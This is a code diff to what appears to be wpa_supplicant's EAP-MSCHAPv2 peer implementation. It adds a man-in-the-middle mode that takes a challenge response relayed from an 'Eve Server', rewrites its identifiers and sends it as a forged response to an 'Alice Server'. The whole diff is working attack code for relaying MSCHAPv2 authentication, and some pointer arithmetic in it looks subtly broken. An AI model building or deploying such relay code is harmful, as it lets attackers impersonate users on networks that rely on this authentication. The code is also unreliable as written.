@@ -24,6 +24,7 @@
 #include "eap_config.h"
 
 #include "eap_example.h"
+#include "eap_common/eap_defs.h"
 
 
 #ifdef _MSC_VER
@@ -246,6 +247,9 @@ static struct wpabuf * eap_mschapv2_challenge(
 	size_t len, challenge_len;
 	const u8 *pos, *challenge;
 
+	enum local_mitm_state {HACK, SKIP, PENDING} lm_state = SKIP;
+	struct wpabuf *resp = NULL;
+
 	if (eap_get_config_identity(sm, &len) == NULL ||
 	    eap_get_config_password(sm, &len) == NULL)
 		return NULL;
@@ -321,7 +325,31 @@ static struct wpabuf * eap_mschapv2_challenge(
 					   "MITM: Send MSCHAPv2 "
 					   "Challenge to Eve Server");
 				break;
+			case 0x2:
+				if (self->mitm_data) {
+					struct eap_hdr *hdr;
+					struct eap_mschapv2_hdr *ms;
+
+					resp = self->mitm_data;
+					self->mitm_data = 0;
+
+					hdr = (void *) resp->buf;
+					hdr->identifier = id;
+					ms = (void *) (resp + sizeof(*hdr) + 1);
+					ms->mschapv2_id = req->mschapv2_id;
+
+					self->mitm_protocol_state = 0x3;
+					k = -1;
+
+					lm_state = HACK;
+					wpa_printf(MSG_DEBUG,
+						   "MITM: Send obtained "
+						   "by forgery Challenge "
+						   "Response to Alice Server");
+				}
+				break;
 			default:
+				lm_state = PENDING;
 				break;
 			}
 		}
@@ -341,13 +369,17 @@ static struct wpabuf * eap_mschapv2_challenge(
 		}
 	}
 
-	ret->ignore = FALSE;
-	ret->methodState = METHOD_MAY_CONT;
-	ret->decision = DECISION_FAIL;
-	ret->allowNotifications = TRUE;
+	if (lm_state == SKIP) {
+		ret->ignore = FALSE;
+		ret->methodState = METHOD_MAY_CONT;
+		ret->decision = DECISION_FAIL;
+		ret->allowNotifications = TRUE;
 
-	return eap_mschapv2_challenge_reply(sm, data, id, req->mschapv2_id,
-					    challenge);
+		resp = eap_mschapv2_challenge_reply(sm, data, id, req->mschapv2_id,
+						    challenge);
+	}
+
+	return resp;
 }
 
 
